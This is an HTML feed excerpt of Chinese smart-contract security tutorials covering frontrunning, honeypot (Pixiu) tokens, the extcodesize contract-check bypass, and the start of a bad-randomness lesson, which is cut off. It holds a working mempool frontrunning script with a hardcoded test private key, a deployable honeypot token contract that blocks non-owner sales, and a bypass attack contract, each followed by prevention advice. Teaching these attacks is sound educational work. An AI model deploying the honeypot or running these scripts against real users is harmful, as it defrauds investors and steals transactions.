class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">// By 0xAA</span><br><span class="line">pragma solidity ^0.8.4;</span><br><span class="line">import &quot;@openzeppelin/contracts/token/ERC721/ERC721.sol&quot;;</span><br><span class="line"></span><br><span class="line">// 我们尝试frontrun一笔Free mint交易</span><br><span class="line">contract FreeMint is ERC721 &#123;</span><br><span class="line">    uint256 public totalSupply;</span><br><span class="line"></span><br><span class="line">    // 构造函数，初始化NFT合集的名称、代号</span><br><span class="line">    constructor() ERC721(&quot;Free Mint NFT&quot;, &quot;FreeMint&quot;)&#123;&#125;</span><br><span class="line"></span><br><span class="line">    // 铸造函数</span><br><span class="line">    function mint() external &#123;</span><br><span class="line">        _mint(msg.sender, totalSupply); // mint</span><br><span class="line">        totalSupply++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>4. 部署ethers.js抢跑脚本：</strong> 简单来说，<code>frontrun.js</code>脚本监听了测试链<code>mempool</code>中的未决交易，筛选出调用了<code>mint()</code>的交易，然后复制它并调高<code>gas</code>进行抢跑。如果你不熟悉<code>ether.js</code>，可以阅读<a href="https://github.com/WTFAcademy/WTF-Ethers">WTF Ethers极简教程</a>。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// provider.on(&quot;pending&quot;, listener)</span></span><br><span class="line"><span class="keyword">import</span> &#123; ethers, utils &#125; <span class="keyword">from</span> <span class="string">&quot;ethers&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 1. 创建provider</span></span><br><span class="line"><span class="keyword">var</span> url = <span class="string">&quot;http://127.0.0.1:8545&quot;</span>;</span><br><span class="line"><span class="keyword">const</span> provider = <span class="keyword">new</span> ethers.<span class="property">providers</span>.<span class="title class_">WebSocketProvider</span>(url);</span><br><span class="line"><span class="keyword">let</span> network = provider.<span class="title function_">getNetwork</span>()</span><br><span class="line">network.<span class="title function_">then</span>(<span class="function"><span class="params">res</span> =&gt;</span> <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`[<span class="subst">$&#123;(<span class="keyword">new</span> <span class="built_in">Date</span>).toLocaleTimeString()&#125;</span>] 连接到 chain ID <span class="subst">$&#123;res.chainId&#125;</span>`</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2. 创建interface对象，用于解码交易详情。</span></span><br><span class="line"><span class="keyword">const</span> iface = <span class="keyword">new</span> utils.<span class="title class_">Interface</span>([</span><br><span class="line">    <span class="string">&quot;function mint() external&quot;</span>,</span><br><span class="line">])</span><br><span class="line"></span><br><span class="line"><span class="comment">// 3. 创建钱包，用于发送抢跑交易</span></span><br><span class="line"><span class="keyword">const</span> privateKey = <span class="string">&#x27;0x5de4111afa1a4b94908f83103eb1f1706367c2e68ca870fc3fb9a804cdab365a&#x27;</span></span><br><span class="line"><span class="keyword">const</span> wallet = <span class="keyword">new</span> ethers.<span class="title class_">Wallet</span>(privateKey, provider)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">main</span> = <span class="keyword">async</span> (<span class="params"></span>) =&gt; &#123;</span><br><span class="line">    <span class="comment">// 4. 监听pending的mint交易，获取交易详情，然后解码。</span></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;\n4. 监听pending交易，获取txHash，并输出交易详情。&quot;</span>)</span><br><span class="line">    provider.<span class="title function_">on</span>(<span class="string">&quot;pending&quot;</span>, <span class="keyword">async</span> (txHash) =&gt; &#123;</span><br><span class="line">        <span class="keyword">if</span> (txHash) &#123;</span><br><span class="line">            <span class="comment">// 获取tx详情</span></span><br><span class="line">            <span class="keyword">let</span> tx = <span class="keyword">await</span> provider.<span class="title function_">getTransaction</span>(txHash);</span><br><span class="line">            <span class="keyword">if</span> (tx) &#123;</span><br><span class="line">                <span class="comment">// filter pendingTx.data</span></span><br><span class="line">                <span class="keyword">if</span> (tx.<span class="property">data</span>.<span class="title function_">indexOf</span>(iface.<span class="title function_">getSighash</span>(<span class="string">&quot;mint&quot;</span>)) !== -<span class="number">1</span> &amp;&amp; tx.<span class="property">from</span> != wallet.<span class="property">address</span> ) &#123;</span><br><span class="line">                    <span class="comment">// 打印txHash</span></span><br><span class="line">                    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`\n[<span class="subst">$&#123;(<span class="keyword">new</span> <span class="built_in">Date</span>).toLocaleTimeString()&#125;</span>] 监听Pending交易: <span class="subst">$&#123;txHash&#125;</span> \r`</span>);</span><br><span class="line"></span><br><span class="line">                    <span class="comment">// 打印解码的交易详情</span></span><br><span class="line">                    <span class="keyword">let</span> parsedTx = iface.<span class="title function_">parseTransaction</span>(tx)</span><br><span class="line">                    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;pending交易详情解码：&quot;</span>)</span><br><span class="line">                    <span class="variable language_">console</span>.<span class="title function_">log</span>(parsedTx);</span><br><span class="line">                    <span class="comment">// Input data解码</span></span><br><span class="line">                    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;raw transaction&quot;</span>)</span><br><span class="line">                    <span class="variable language_">console</span>.<span class="title function_">log</span>(tx);</span><br><span class="line"></span><br><span class="line">                    <span class="comment">// 构建抢跑tx</span></span><br><span class="line">                    <span class="keyword">const</span> txFrontrun = &#123;</span><br><span class="line">                        <span class="attr">to</span>: tx.<span class="property">to</span>,</span><br><span class="line">                        <span class="attr">value</span>: tx.<span class="property">value</span>,</span><br><span class="line">                        <span class="attr">maxPriorityFeePerGas</span>: tx.<span class="property">maxPriorityFeePerGas</span> * <span class="number">1.2</span>,</span><br><span class="line">                        <span class="attr">maxFeePerGas</span>: tx.<span class="property">maxFeePerGas</span> * <span class="number">1.2</span>,</span><br><span class="line">                        <span class="attr">gasLimit</span>: tx.<span class="property">gasLimit</span> * <span class="number">2</span>,</span><br><span class="line">                        <span class="attr">data</span>: tx.<span class="property">data</span></span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="comment">// 发送抢跑交易</span></span><br><span class="line">                    <span class="keyword">var</span> txResponse = <span class="keyword">await</span> wallet.<span class="title function_">sendTransaction</span>(txFrontrun)</span><br><span class="line">                    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`正在frontrun交易`</span>)</span><br><span class="line">                    <span class="keyword">await</span> txResponse.<span class="title function_">wait</span>()</span><br><span class="line">                    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`frontrun 交易成功`</span>)                </span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    provider.<span class="property">_websocket</span>.<span class="title function_">on</span>(<span class="string">&quot;error&quot;</span>, <span class="keyword">async</span> () =&gt; &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`Unable to connect to <span class="subst">$&#123;ep.subdomain&#125;</span> retrying in 3s...`</span>);</span><br><span class="line">        <span class="built_in">setTimeout</span>(init, <span class="number">3000</span>);</span><br><span class="line">      &#125;);</span><br><span class="line"></span><br><span class="line">    provider.<span class="property">_websocket</span>.<span class="title function_">on</span>(<span class="string">&quot;close&quot;</span>, <span class="keyword">async</span> (code) =&gt; &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(</span><br><span class="line">            <span class="string">`Connection lost with code <span class="subst">$&#123;code&#125;</span>! Attempting reconnect in 3s...`</span></span><br><span class="line">        );</span><br><span class="line">        provider.<span class="property">_websocket</span>.<span class="title function_">terminate</span>();</span><br><span class="line">        <span class="built_in">setTimeout</span>(init, <span class="number">3000</span>);</span><br><span class="line">    &#125;);    </span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="title function_">main</span>()</span><br></pre></td></tr></table></figure><p><strong>5. 调用<code>mint()</code>函数：</strong> 在 Remix 的部署页面调用 Freemint 合约的<code>mint()</code> 函数，进行 NFT 铸造。</p><p><strong>6. 脚本监听到交易并进行抢跑</strong> 我们可以在终端看到 <code>frontrun.js</code> 脚本成功监听到了交易，并进行了抢跑。如果你调用 NFT 合约的 <code>ownerOf()</code> 函数查看 <code>tokenId</code> 为 0 的持有者是抢跑脚本中的钱包地址，证明抢跑成功！。</p><p><img src="/2023/06/23/00.security/33.%E6%8A%A2%E5%85%88%E4%BA%A4%E6%98%93_2/S11-4.png" alt="img"></p><h2 id="预防方法"><a href="#预防方法" class="headerlink" title="预防方法"></a>预防方法</h2><p>抢先交易是以太坊等公链上普遍存在的问题。我们没法消除它，但是可以通过减少交易顺序或时间的重要性，减少被抢先交易的收益：</p><ul><li>使用预提交方案(commit-reveal scheme)。</li><li>使用暗池，用户发出的交易将不进入公开的<code>mempool</code>，而是直接到矿工手里。例如 flashbots 和 TaiChi。</li></ul><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这一讲，我们介绍了以太坊的抢先交易，也叫抢跑。这种起源于传统金融行业的攻击模式在区块链中更容易实施，因为所有的交易信息都是公开的。我们做了一个抢跑的时间：抢跑一笔铸造 NFT 的交易。当需要有类似的交易时，最好支持隐藏的内存池，或者实施批量拍卖等措施限制。它是以太坊等公链上普遍存在的问题，我们没法消除它，但是可以通过减少交易顺序或时间的重要性，减少被抢先交易的收益。</p>]]></content>
      
      
      <categories>
          
          <category> 00.security </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>32.貔貅</title>
      <link href="/2023/06/23/00.security/32.%D1%85%D1%89%D1%85%D1%87/"/>
      <url>/2023/06/23/00.security/32.%D1%85%D1%89%D1%85%D1%87/</url>
      
        <content type="html"><![CDATA[<h1 id="貔貅"><a href="#貔貅" class="headerlink" title="貔貅"></a>貔貅</h1><p>这一讲，我们将介绍貔貅合约和预防方法（英文习惯叫蜜罐代币 honeypot token）。</p><h2 id="貔貅学入门"><a href="#貔貅学入门" class="headerlink" title="貔貅学入门"></a>貔貅学入门</h2><p><a href="https://en.wikipedia.org/wiki/Pixiu">貔貅</a>是中国的一个神兽，因为在天庭犯了戒，被玉帝揍的肛门封闭了，只能吃不能拉，可以帮人们聚财。但在Web3中，貔貅变为了不详之兽，韭菜的天敌。貔貅盘的特点：投资人只能买不能卖，仅有项目方地址能卖出。</p><p>通常一个貔貅盘有如下的生命周期：</p><ol><li>恶意项目方部署貔貅代币合约。</li><li>宣传貔貅代币让散户上车，由于只能买不能卖，代币价格会一路走高。</li><li>项目方<code>rug pull</code>卷走资金。</li></ol><p>学会貔貅合约的原理，才能更好的识别并避免被割，才能做一个顽强的韭菜！</p><h2 id="貔貅合约"><a href="#貔貅合约" class="headerlink" title="貔貅合约"></a>貔貅合约</h2><p>这里我们介绍一个极简的ERC20代币貔貅合约<code>Pixiu</code>。在该合约中，只有合约拥有者可以在<code>uniswap</code>出售代币，其他地址不能。</p><p><code>Pixiu</code> 有一个状态变量<code>pair</code>，用于记录<code>uniswap</code>中 <code>Pixiu-ETH LP</code>的币对地址。它主要有三个函数：</p><ol><li>构造函数：初始化代币的名称和代号，并根据 <code>uniswap</code> 和 <code>create2</code> 的原理计算<code>LP</code>合约地址，具体内容可以参考 <a href="https://github.com/AmazingAng/WTFSolidity/blob/main/25_Create2/readme.md">WTF Solidity 第25讲: Create2</a>。这个地址会在 <code>_beforeTokenTransfer()</code> 函数中用到。</li><li><code>mint()</code>：铸造函数，仅 <code>owner</code> 地址可以调用，用于铸造 <code>Pixiu</code> 代币。</li><li><code>_beforeTokenTransfer()</code>：<code>ERC20</code>代币在被转账前会调用的函数。在其中，我们限制了当转账的目标地址 <code>to</code> 为 <code>LP</code> 的时候，也就是韭菜卖出的时候，交易会 <code>revert</code>；只有调用者为<code>owner</code>的时候能够成功。这也是貔貅合约的核心。</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">// 极简貔貅ERC20代币，只能买，不能卖</span><br><span class="line">contract HoneyPot is ERC20, Ownable &#123;</span><br><span class="line">    address public pair;</span><br><span class="line"></span><br><span class="line">    // 构造函数：初始化代币名称和代号</span><br><span class="line">    constructor() ERC20(&quot;HoneyPot&quot;, &quot;Pi Xiu&quot;) &#123;</span><br><span class="line">        address factory = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f; // goerli uniswap v2 factory</span><br><span class="line">        address tokenA = address(this); // 貔貅代币地址</span><br><span class="line">        address tokenB = 0xB4FBF271143F4FBf7B91A5ded31805e42b2208d6; //  goerli WETH</span><br><span class="line">        (address token0, address token1) = tokenA &lt; tokenB ? (tokenA, tokenB) : (tokenB, tokenA); //将tokenA和tokenB按大小排序</span><br><span class="line">        bytes32 salt = keccak256(abi.encodePacked(token0, token1));</span><br><span class="line">        // calculate pair address</span><br><span class="line">        pair = address(uint160(uint(keccak256(abi.encodePacked(</span><br><span class="line">        hex&#x27;ff&#x27;,</span><br><span class="line">        factory,</span><br><span class="line">        salt,</span><br><span class="line">        hex&#x27;96e8ac4277198ff8b6f785478aa9a39f403cb768dd02cbee326c3e7da348845f&#x27;</span><br><span class="line">        )))));</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    /**</span><br><span class="line">     * 铸造函数，只有合约所有者可以调用</span><br><span class="line">     */</span><br><span class="line">    function mint(address to, uint amount) public onlyOwner &#123;</span><br><span class="line">        _mint(to, amount);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * @dev See &#123;ERC20-_beforeTokenTransfer&#125;.</span><br><span class="line">     * 貔貅函数：只有合约拥有者可以卖出</span><br><span class="line">     */</span><br><span class="line">    function _beforeTokenTransfer(</span><br><span class="line">        address from,</span><br><span class="line">        address to,</span><br><span class="line">        uint256 amount</span><br><span class="line">    ) internal virtual override &#123;</span><br><span class="line">        super._beforeTokenTransfer(from, to, amount);</span><br><span class="line">        // 当转账的目标地址为 LP 时，会revert</span><br><span class="line">        if(to == pair)&#123;</span><br><span class="line">            require(from == owner(), &quot;Can not Transfer&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Remix-复现"><a href="#Remix-复现" class="headerlink" title="Remix 复现"></a>Remix 复现</h2><p>我们会在 <code>Goerli</code> 测试网上部署 <code>Pixiu</code> 合约，并在 <code>uniswap</code> 交易所中演示。</p><p>1.部署 <code>Pixiu</code> 合约。</p><p><img src="/2023/06/23/00.security/32.%D1%85%D1%89%D1%85%D1%87/S10-2.png" alt="img"></p><p>2.调用 <code>mint()</code> 函数，给自己铸造 <code>100000</code> 枚貔貅币。</p><p><img src="/2023/06/23/00.security/32.%D1%85%D1%89%D1%85%D1%87/S10-3.png" alt="img"></p><p>3.进入 <a href="https://app.uniswap.org/#/add/v2/ETH">uniswap</a> 交易所，为貔貅币创造流动性（v2），提供 <code>10000</code>貔貅币。和 <code>0.1</code> ETH。</p><p><img src="/2023/06/23/00.security/32.%D1%85%D1%89%D1%85%D1%87/S10-4.png" alt="img"></p><p>4.出售 <code>100</code> 貔貅币，能够操作成功。</p><p><img src="/2023/06/23/00.security/32.%D1%85%D1%89%D1%85%D1%87/S10-5.png" alt="img"></p><p>5.切换到另一个账户，使用 <code>0.01</code> ETH 购买貔貅币，能够操作成功。</p><p><img src="/2023/06/23/00.security/32.%D1%85%D1%89%D1%85%D1%87/S10-6.png" alt="img"></p><p>6.出售貔貅币，无法弹出交易。</p><p><img src="/2023/06/23/00.security/32.%D1%85%D1%89%D1%85%D1%87/S10-7.png" alt="img"></p><h2 id="预防方法"><a href="#预防方法" class="headerlink" title="预防方法"></a>预防方法</h2><p>貔貅币是韭菜在链上梭哈最容易遇到的骗局，并且形式多变，预防非常有难度。我们有以下几点建议，可以降低被貔貅盘割韭菜的风险：</p><ol><li>在区块链浏览器上（比如<a href="https://etherscan.io/">etherscan</a>）查看合约是否开源，如果开源，则分析它的代码，看是否有貔貅漏洞。</li><li>如果没有编程能力，可以使用貔貅识别工具，比如 <a href="https://tokensniffer.com/">Token Sniffer</a> 和 <a href="https://ave.ai/check">Ave Check</a>，分低的话大概率是貔貅。</li><li>看项目是否有审计报告。</li><li>仔细检查项目的官网和社交媒体。</li><li>只投资你了解的项目，做好研究（DYOR）。</li></ol><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这一讲，我们介绍了貔貅合约和预防貔貅盘的方法。貔貅盘是每个韭菜必经之路，大家也对它恨之入骨。另外，最近也出现貔貅 <code>NFT</code>，恶意项目方通过修改 <code>ERC721</code> 的转账或授权函数，使得普通投资者不能出售它们。了解貔貅合约的原理和预防方法，可以显著减少你买到貔貅盘的概率，让你的资金更安全，大家要不断学习。</p>]]></content>
      
      
      <categories>
          
          <category> 00.security </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>31.绕过合约长度检查</title>
      <link href="/2023/06/23/00.security/31.%E7%BB%95%E8%BF%87%E5%90%88%E7%BA%A6%E9%95%BF%E5%BA%A6%E6%A3%80%E6%9F%A5/"/>
      <url>/2023/06/23/00.security/31.%E7%BB%95%E8%BF%87%E5%90%88%E7%BA%A6%E9%95%BF%E5%BA%A6%E6%A3%80%E6%9F%A5/</url>
      
        <content type="html"><![CDATA[<h1 id="绕过合约长度检查"><a href="#绕过合约长度检查" class="headerlink" title="绕过合约长度检查"></a>绕过合约长度检查</h1><p><a href="https://github.com/AmazingAng/WTF-Solidity/blob/main/S08_ContractCheck/readme.md">转载</a></p><p>这一讲，我们将介绍绕过合约长度检查，并介绍预防的方法。</p><h2 id="绕过合约检查"><a href="#绕过合约检查" class="headerlink" title="绕过合约检查"></a>绕过合约检查</h2><p>很多 freemint 的项目为了限制科学家（程序员）会用到 <code>isContract()</code> 方法，希望将调用者 <code>msg.sender</code> 限制为外部账户（EOA），而非合约。这个函数利用 <code>extcodesize</code> 获取该地址所存储的 <code>bytecode</code> 长度（runtime），若大于0，则判断为合约，否则就是EOA（用户）。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">// 利用 extcodesize 检查是否为合约</span><br><span class="line">function isContract(address account) public view returns (bool) &#123;</span><br><span class="line">    // extcodesize &gt; 0 的地址一定是合约地址</span><br><span class="line">    // 但是合约在构造函数时候 extcodesize 为0</span><br><span class="line">    uint size;</span><br><span class="line">    assembly &#123;</span><br><span class="line">        size := extcodesize(account)</span><br><span class="line">    &#125;</span><br><span class="line">    return size &gt; 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里有一个漏洞，就是在合约在被创建的时候，<code>runtime bytecode</code> 还没有被存储到地址上，因此 <code>bytecode</code> 长度为0。也就是说，如果我们将逻辑写在合约的构造函数 <code>constructor</code> 中的话，就可以绕过 <code>isContract()</code> 检查。</p><p><img src="/2023/06/23/00.security/31.%E7%BB%95%E8%BF%87%E5%90%88%E7%BA%A6%E9%95%BF%E5%BA%A6%E6%A3%80%E6%9F%A5/S08-1.png" alt="img"></p><h2 id="漏洞例子"><a href="#漏洞例子" class="headerlink" title="漏洞例子"></a>漏洞例子</h2><p>下面我们来看一个例子：<code>ContractCheck</code>合约是一个 freemint ERC20 合约，铸造函数 <code>mint()</code> 中使用了 <code>isContract()</code> 函数来阻止合约地址的调用，防止科学家批量铸造。每次调用 <code>mint()</code> 可以铸造 100 枚代币。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">// 用extcodesize检查是否为合约地址</span><br><span class="line">contract ContractCheck is ERC20 &#123;</span><br><span class="line">    // 构造函数：初始化代币名称和代号</span><br><span class="line">    constructor() ERC20(&quot;&quot;, &quot;&quot;) &#123;&#125;</span><br><span class="line">    </span><br><span class="line">    // 利用 extcodesize 检查是否为合约</span><br><span class="line">    function isContract(address account) public view returns (bool) &#123;</span><br><span class="line">        // extcodesize &gt; 0 的地址一定是合约地址</span><br><span class="line">        // 但是合约在构造函数时候 extcodesize 为0</span><br><span class="line">        uint size;</span><br><span class="line">        assembly &#123;</span><br><span class="line">            size := extcodesize(account)</span><br><span class="line">        &#125;</span><br><span class="line">        return size &gt; 0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // mint函数，只有非合约地址能调用（有漏洞）</span><br><span class="line">    function mint() public &#123;</span><br><span class="line">        require(!isContract(msg.sender), &quot;Contract not allowed!&quot;);</span><br><span class="line">        _mint(msg.sender, 100);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们写一个攻击合约，在 <code>constructor</code> 中多次调用 <code>ContractCheck</code> 合约中的 <code>mint()</code> 函数，批量铸造 <code>1000</code> 枚代币：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">// 利用构造函数的特点攻击</span><br><span class="line">contract NotContract &#123;</span><br><span class="line">    bool public isContract;</span><br><span class="line">    address public contractCheck;</span><br><span class="line"></span><br><span class="line">    // 当合约正在被创建时，extcodesize (代码长度) 为 0，因此不会被 isContract() 检测出。</span><br><span class="line">    constructor(address addr) &#123;</span><br><span class="line">        contractCheck = addr;</span><br><span class="line">        isContract = ContractCheck(addr).isContract(address(this));</span><br><span class="line">        // This will work</span><br><span class="line">        for(uint i; i &lt; 10; i++)&#123;</span><br><span class="line">            ContractCheck(addr).mint();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 合约创建好以后，extcodesize &gt; 0，isContract() 可以检测</span><br><span class="line">    function mint() external &#123;</span><br><span class="line">        ContractCheck(contractCheck).mint();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果我们之前讲的是正确的话，在构造函数调用 <code>mint()</code> 可以绕过 <code>isContract()</code> 的检查成功铸造代币，那么函数将成功部署，并且状态变量 <code>isContract</code> 会在构造函数赋值 <code>false</code>。而在合约部署之后，<code>runtime bytecode</code> 已经被存储在合约地址上了，<code>extcodesize &gt; 0</code>， <code>isContract()</code> 能够成功阻止铸造，调用 <code>mint()</code> 函数将失败。</p><h2 id="Remix-复现"><a href="#Remix-复现" class="headerlink" title="Remix 复现"></a><code>Remix</code> 复现</h2><ol><li>部署 <code>ContractCheck</code> 合约。</li><li>部署 <code>NotContract</code> 合约，参数为 <code>ContractCheck</code> 合约地址。</li><li>调用 <code>ContractCheck</code> 合约的 <code>balanceOf</code> 查看 <code>NotContract</code> 合约的代币余额为 <code>1000</code>，攻击成功。</li><li>调用<code>NotContract</code> 合约的 <code>mint()</code> 函数，由于此时合约已经部署完成，调用 <code>mint()</code> 函数将失败。</li></ol><h2 id="预防办法"><a href="#预防办法" class="headerlink" title="预防办法"></a>预防办法</h2><p>你可以使用 <code>(tx.origin == msg.sender)</code> 来检测调用者是否为合约。如果调用者为 EOA，那么<code>tx.origin</code>和<code>msg.sender</code>相等；如果它们俩不相等，调用者为合约。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function realContract(address account) public view returns (bool) &#123;</span><br><span class="line">    return (tx.origin == msg.sender);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这一讲，我们介绍了合约长度检查可以被绕过的漏洞，并介绍预防的方法。如果一个地址的 <code>extcodesize &gt; 0</code>，则该地址一定为合约；但如果 <code>extcodesize = 0</code>，该地址既可能为 <code>EOA</code>，也可能为正在创建状态的合约。</p>]]></content>
      
      
      <categories>
          
          <category> 00.security </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>30.坏随机数</title>
      <link href="/2023/06/23/00.security/30.%E5%9D%8F%E9%9A%8F%E6%9C%BA%E6%95%B0/"/>
      <url>/2023/06/23/00.security/30.%E5%9D%8F%E9%9A%8F%E6%9C%BA%E6%95%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="坏随机数"><a href="#坏随机数" class="headerlink" title="坏随机数"></a>坏随机数</h1><p><a href="https://github.com/AmazingAng/WTF-Solidity/blob/main/S07_BadRandomness/readme.md">转载</a></p><p>这一讲，我们将介绍智能合约的坏随机数（Bad Randomness）漏洞和预防方法，这个漏洞经常在 NFT 和 GameFi 中出现，包括 Meebits，Loots，Wolf Game等。</p><h2 id="伪随机数"><a href="#伪随机数" class="headerlink" title="伪随机数"></a>伪随机数</h2><p>很多以太坊上的应用都需要用到随机数，例如<code>NFT</code>随机抽取<code>tokenId</code>、抽盲盒、<code>gamefi</code>战斗中随机分胜负等等。但是由于以太坊上所有数据都是公开透明（<code>public</code>）且确定性（<code>deterministic</code>）的，它没有其他编程语言一样给开发者提供生成随机数的方法，例如<code>random()</code>。很多项目方不得不使用链上的伪随机数生成方法，例如 <code>blockhash()</code> 和 <code>keccak256()</code> 方法。</p><p>坏随机数漏洞：攻击者可以事先计算这些伪随机数的结果，从而达到他们想要的目的，例如铸造任何他们想要的稀有<code>NFT</code>而非随机抽取。更多的内容可以阅读 <a href="https://github.com/AmazingAng/WTF-Solidity/tree/main/39_Random">WTF Solidity极简教程 第39讲：伪随机数</a>。</p><p><img src="/2023/06/23/00.security/30.%E5%9D%8F%E9%9A%8F%E6%9C%BA%E6%95%B0/S07-1.png" alt="img"></p><h2 id="坏随机数案例"><a href="#坏随机数案例" class="headerlink" title="坏随机数案例"></a>坏随机数案例</h2><p>下面我们学习一个有坏随机数漏洞的 NFT 合约： BadRandomness.sol。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span 